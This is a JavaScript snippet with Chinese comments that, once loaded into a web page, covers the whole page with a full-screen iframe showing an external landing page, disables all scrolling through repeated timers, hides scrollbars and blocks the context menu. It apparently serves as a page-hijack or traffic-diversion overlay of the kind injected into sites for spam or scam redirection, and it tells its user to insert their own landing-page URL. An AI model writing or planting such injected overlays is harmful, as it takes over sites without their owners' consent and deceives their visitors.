(function() {
    // 检查是否已经注入，避免重复执行
    if (document.querySelector('.jnh_iframe_hidden')) {
        return;
    }

    let retryCount = 0;
    const MAX_RETRIES = 20; // 最大重试次数，确保 DOM 完全加载

    // --- 核心函数：强制禁用所有滚动 ---
    function forceDisableAllScrolls() {
        const body = document.body;
        const html = document.documentElement;

        if (!body || !html) return; // 如果body或html不存在，则不执行

        // 1. 强制 body 和 html 不可滚动，并填充整个视口
        body.style.setProperty('overflow', 'hidden', 'important');
        html.style.setProperty('overflow', 'hidden', 'important');
        body.style.setProperty('width', '100%', 'important');
        body.style.setProperty('height', '100%', 'important');
        html.style.setProperty('width', '100%', 'important');
        html.style.setProperty('height', '100%', 'important');
        body.style.setProperty('margin', '0', 'important');
        body.style.setProperty('padding', '0', 'important');
        html.style.setProperty('margin', '0', 'important');
        html.style.setProperty('padding', '0', 'important');

        // 2. 尝试找到所有可能的滚动元素并禁用其滚动条
        const elements = document.querySelectorAll('*'); // 选择所有元素
        elements.forEach(el => {
            if (el.nodeType === 1) { // 确保是元素节点
                // 检查计算样式，如果发现有可滚动的属性，则强制隐藏
                const computedStyle = window.getComputedStyle(el);
                if (computedStyle.overflowY === 'scroll' || computedStyle.overflowY === 'auto' ||
                    computedStyle.overflowX === 'scroll' || computedStyle.overflowX === 'auto') {
                    el.style.setProperty('overflow', 'hidden', 'important');
                }
            }
        });
    }

    // --- 初始化和显示 iframe ---
    function initializeAndShowIframe() {
        const body = document.body;
        const html = document.documentElement;

        // 如果 body 或 html 元素尚未加载，则重试
        if (!body || !html) {
            if (retryCount < MAX_RETRIES) {
                retryCount++;
                setTimeout(initializeAndShowIframe, 50); // 间隔 50ms 重试
            } else {
                console.error("JNH Loader Error: document.body or document.documentElement not available after multiple retries.");
            }
            return;
        }

        // 立即且持续地禁用所有可能的滚动，以防止任何闪烁或穿透
        forceDisableAllScrolls();

        // 创建 iframe 元素
        const snpIframe = document.createElement('iframe');
        snpIframe.src = 'https://my-landing-page-9ru.pages.dev'; // <-- ***请务必将此URL替换为您实际的落地页URL***
        snpIframe.frameBorder = '0'; // 移除边框
        snpIframe.rel = 'nofollow'; // 对搜索引擎更友好，表示不跟踪
        snpIframe.className = 'jnh_iframe_hidden'; // 添加 class 标识

        // 关键样式：确保 iframe 全屏固定覆盖，且自身不可滚动
        snpIframe.style.cssText = `
            position: fixed !important; /* 强制固定定位 */
            left: 0 !important;
            top: 0 !important;
            width: 100% !important;
            height: 100% !important;
            z-index: 2147483646 !important; /* 确保在最顶层 */
            display: block !important; /* 确保显示 */
            border: none !important; /* 再次确认无边框 */
            margin: 0 !important;
            padding: 0 !important;
            overflow: hidden !important; /* 强制防止 iframe 内部出现滚动条 */
            overscroll-behavior: contain !important; /* 阻止滚动链 (scroll chaining) */
            transform: translateZ(0) !important; /* 可能有助于某些渲染问题 */
        `;

        // 禁用 iframe 的鼠标右键菜单
        snpIframe.oncontextmenu = function() {
            return false;
        };

        // 阻止在 iframe 上的触控/鼠标事件冒泡到父页面 (防止穿透滚动)
        snpIframe.addEventListener('wheel', function(e) {
            e.preventDefault();
            e.stopPropagation();
        }, { passive: false });
        snpIframe.addEventListener('touchmove', function(e) {
            e.preventDefault();
            e.stopPropagation();
        }, { passive: false });


        body.appendChild(snpIframe);

        // 再次强制禁用所有滚动
        forceDisableAllScrolls();

        // 注入全局 CSS 规则，确保覆盖性
        const style = document.createElement('style');
        style.innerHTML = `
            body, html {
                overflow: hidden !important; /* 最强力的禁用滚动 */
                width: 100% !important;
                height: 100% !important;
                margin: 0 !important;
                padding: 0 !important;
            }
            /* 针对 Webkit 浏览器隐藏滚动条 */
            ::-webkit-scrollbar {
                display: none !important; /* 使用 !important */
            }
            /* IE and Edge */
            html {
                -ms-overflow-style: none !important;
                scrollbar-width: none !important; /* Firefox */
            }
            /* 强制所有常见的可滚动元素都隐藏，防止背景内容露出 */
            /* 谨慎使用，可能影响页面上其他元素的正常滚动 */
            div, section, article, main, aside, nav, header, footer {
                overflow: hidden !important;
            }
        `;
        document.head.appendChild(style);


        // 确保在 iframe 加载完成后再次禁用滚动，以防万一
        snpIframe.onload = function() {
            forceDisableAllScrolls();
            // 在 iframe 加载完成后，可能需要额外的延迟来处理 iframe 内部布局导致的滚动
            setTimeout(forceDisableAllScrolls, 100);
        };

        // 最终检查，延迟执行，确保所有动态内容加载后依然禁用
        setInterval(forceDisableAllScrolls, 200); // 每200ms持续检查和禁用，直到用户关闭页面

    }

    // 根据文档加载状态决定何时初始化 iframe
    if (document.readyState === "complete" || document.readyState === "interactive") {
        initializeAndShowIframe();
    } else {
        document.addEventListener("DOMContentLoaded", initializeAndShowIframe);
    }

    // 在文档加载的早期就尝试禁用滚动，防止任何闪烁或早期滚动
    forceDisableAllScrolls();
    // 持续监听，确保背景不会意外滚动
    setInterval(forceDisableAllScrolls, 100);

})();
